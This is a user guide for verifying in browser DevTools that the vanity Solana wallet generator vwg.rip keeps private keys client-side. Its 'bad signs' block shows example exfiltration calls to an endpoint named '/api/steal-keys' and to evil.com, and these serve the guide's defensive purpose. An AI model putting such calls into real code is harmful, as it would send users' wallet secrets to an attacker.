# Browser DevTools Verification Guide

This guide shows you how to verify that vwg.rip does NOT send your private keys to any server.

---

## ✅ What You'll Verify

- No network requests during wallet generation
- Private keys stay in your browser
- Only public keys are sent (if you choose to save)

---

## 🛠️ Step-by-Step Instructions

### Step 1: Open Developer Tools

**Chrome/Edge/Brave**:
- Press `F12` or `Ctrl+Shift+I` (Windows/Linux)
- Press `Cmd+Option+I` (Mac)

**Firefox**:
- Press `F12` or `Ctrl+Shift+K` (Windows/Linux)
- Press `Cmd+Option+K` (Mac)

**Safari**:
- Enable: Safari → Settings → Advanced → "Show Develop menu"
- Press `Cmd+Option+I`

---

### Step 2: Go to Network Tab

1. Click the **"Network"** tab in DevTools
2. Make sure it's recording (red circle should be filled)
3. Clear existing requests (trash icon)

---

### Step 3: Filter for Server Requests

In the filter bar, select:
- **"Fetch/XHR"** (Chrome/Edge/Brave)
- **"XHR"** (Firefox)

This shows only data requests (not images, CSS, etc.)

---

### Step 4: Visit vwg.rip

1. Navigate to `https://vwg.rip`
2. You'll see some initial requests:
   - Loading the page HTML
   - Loading CSS/JavaScript files
   - Loading the Solana library from CDN

**This is normal** - the app needs to load.

3. Once loaded, **clear the Network tab** again (trash icon)

Now we're ready to test wallet generation.

---

### Step 5: Generate a Wallet

1. Enter a vanity prefix (e.g., "Ape")
2. Click "Generate"
3. **Watch the Network tab** carefully

---

### Step 6: Observe the Results

**Expected Result**: **ZERO new requests** in the Network tab.

You should see:
```
No requests captured yet
```
Or an empty list.

**Why?**: Wallet generation happens 100% in your browser's Web Worker. No server communication.

---

### Step 7: (Optional) Save to Leaderboard

If you want to test the save feature:

1. When a wallet is found, click "Save to Leaderboard"
2. NOW you'll see a request appear

**Expected Request**:
- **URL**: `/api/wallets` or similar
- **Method**: `POST`
- **Payload**: Click to inspect

You should see:
```json
{
  "publicKey": "Ape1a2b3c4d5...",
  "pattern": "Ape...",
  "attempts": 1234567,
  "matchLength": 3
}
```

**What you will NOT see**:
- ❌ `privateKey`
- ❌ `secretKey`
- ❌ `seedPhrase`

Only the **public** key is sent.

---

## 🔍 Advanced: Inspect Web Worker

### Step 8: View Worker Source

1. DevTools → **Sources** tab
2. Look for `vanity-worker.js` in the file tree
3. Click to view the source code

**What to look for**:

✅ **Good signs**:
```javascript
// Line 78 (approx):
const keypair = Keypair.generate();

// Line 93 (approx):
secretKey: Array.from(keypair.secretKey)
```

❌ **Bad signs** (these do NOT exist in the code):
```javascript
// ❌ None of these exist:
fetch('/api/steal-keys', { ... })
XMLHttpRequest('https://evil.com', ...)
navigator.sendBeacon(...)
```

Search the entire file (Ctrl+F) for:
- `fetch(` - **Not found** ✅
- `XMLHttpRequest` - **Not found** ✅
- `.ajax` - **Not found** ✅

**Conclusion**: The worker has NO code to send data anywhere.

---

## 🔒 Step 9: Test Offline Mode

The ultimate test:

1. Generate a wallet successfully (so the page is cached)
2. **Disconnect from the internet**:
   - Unplug ethernet cable, or
   - Turn off Wi-Fi, or
   - Chrome DevTools → Network tab → "Offline" checkbox
3. Refresh the page (might load from cache)
4. Try generating another wallet

**Expected Result**: It still works! 🎉

**Why?**: Because wallet generation doesn't need a server. It's 100% client-side.

---

## 📊 Visual Reference

### What You Should See (Step 5-6):

**Before generation**:
```
Network Tab (Fetch/XHR)
─────────────────────────
[Empty or only page load requests]
```

**During generation** (30 seconds of searching):
```
Network Tab (Fetch/XHR)
─────────────────────────
[Still empty - NO new requests]
```

**After finding wallet** (without saving):
```
Network Tab (Fetch/XHR)
─────────────────────────
[Still empty - NO new requests]
```

**After clicking "Save to Leaderboard"**:
```
Network Tab (Fetch/XHR)
─────────────────────────
POST /api/wallets    200   456 ms
  ↳ Payload: { publicKey: "...", pattern: "...", ... }
  ↳ NO privateKey in payload ✅
```

---

## ❓ FAQ

### Q: I see requests to `cdn.jsdelivr.net` - is that suspicious?

**A**: No, that's normal. The Solana library is loaded from JSDelivr CDN:
```
https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.8/lib/index.iife.min.js
```

This happens ONCE when the worker starts, NOT during key generation.

### Q: What if I see requests I don't recognize?

**A**: Common legitimate requests:
- Analytics (e.g., Google Analytics, Vercel Analytics)
- Error tracking (e.g., Sentry)
- Font loading (Google Fonts)

**Red flags** (should NOT appear during generation):
- Requests containing "key", "private", "secret" in URL or payload
- POST requests to unknown domains
- Requests during the generation process itself

### Q: Can I save a screenshot as proof?

**A**: Yes! Take screenshots of:
1. Network tab showing zero requests during generation
2. Payload of save request (showing only public key)
3. Worker source code (showing no fetch calls)

---

## 🎯 Summary Checklist

After completing this guide, you should have verified:

- [ ] Network tab shows ZERO requests during wallet generation
- [ ] Worker source code has no `fetch()` or network calls
- [ ] Save to leaderboard only sends public key (not private)
- [ ] App works offline (proving no server dependency)
- [ ] Private key only appears in YOUR browser UI, never in Network tab

**If all boxes are checked, you've confirmed the security claims.** ✅

---

**Next Steps**:
- [Source Inspection Guide](./source-inspection.md) - Compare code with production
- [Network Analysis Guide](./network-analysis.md) - Deep packet inspection (advanced)
